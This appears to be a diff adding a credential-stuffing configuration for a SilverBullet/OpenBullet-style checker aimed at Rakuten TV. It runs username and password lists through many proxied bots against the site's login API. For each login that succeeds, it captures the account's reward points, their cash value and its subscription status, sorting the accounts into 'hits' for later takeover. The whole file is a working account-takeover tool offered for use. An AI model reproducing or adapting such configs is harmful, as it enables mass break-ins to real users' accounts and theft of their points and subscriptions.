@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "Rakuten",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-02T22:48:11.4429139+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "simple",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Rakuten",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST GET "https://rakuten.tv/uk/sessions/sign_in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<COOKIES(rktv)>" LR "" "" -> VAR "rktv" 
+
+REQUEST POST "https://rakuten.tv/api/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "rktv: <rktv>" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://rakuten.tv" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://rakuten.tv/uk/sessions/sign_in" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your email or password was incorrect." 
+  KEYCHAIN Success OR 
+    KEY "{\"isLogged\":true" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOK" 
+
+PARSE "<SOURCE>" JSON "session_uuid" -> VAR "SUUID" 
+
+FUNCTION CurrentUnixTime -> VAR "TIME" 
+
+REQUEST GET "https://gizmo.rakuten.tv/v3/me/points?classification_id=18&device_identifier=web&device_serial=a130430f-61e5-47db-aed7-7a41c41dd241&locale=en&market_code=uk&session_uuid=<SUUID>&timestamp=<TIME>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "points\",\"value\":" ",\"" -> VAR "POINTS" 
+
+PARSE "<SOURCE>" LR "equivalence_in_money_with_currency\":\"" "\",\"" -> VAR "MONEY" 
+
+FUNCTION Constant "<POINTS> - <MONEY>" -> CAP "Points" 
+
+REQUEST POST "https://gizmo.rakuten.tv/v3/me/start?classification_id=18&device_identifier=web&device_serial=a130430f-61e5-47db-aed7-7a41c41dd241&locale=en&market_code=uk&resume=true&session_uuid=<SUUID>j&timestamp=<TIME>&signature=npaU0ZPgDuTiq4I8SaJjENyQlhA=" 
+  CONTENT "{\"device_identifier\":\"web\",\"access_token\":\"<TOK>\",\"session_uuid\":\"<SUUID>\",\"resume\":true,\"device_metadata\":{\"brand\":\"kraken\",\"model\":\"desktop\",\"year\":2015,\"os\":\"Windows 10.0\",\"uid\":\"a130430f-61e5-47db-aed7-7a41c41dd241\",\"app_version\":\"kraken-1.888.0\",\"trusted_uid\":false,\"serial_number\":\"a130430f-61e5-47db-aed7-7a41c41dd241\",\"firmware\":\"\",\"sdk\":\"\",\"video_quality\":\"FHD\",\"audio_quality\":\"2.0\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://rakuten.tv" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://rakuten.tv/" 
+  HEADER "sec-ch-ua: \"Microsoft Edge\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38" 
+
+PARSE "<SOURCE>" JSON "subscribed" CreateEmpty=FALSE -> CAP "isSubscribed" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<POINTS>" Contains "0" 
+    KEY "<isSubscribed>" Contains "false" 
+  KEYCHAIN Success OR 
+    KEY "<POINTS>" DoesNotContain "0" 
+    KEY "<isSubscribed>" Contains "true" 
+
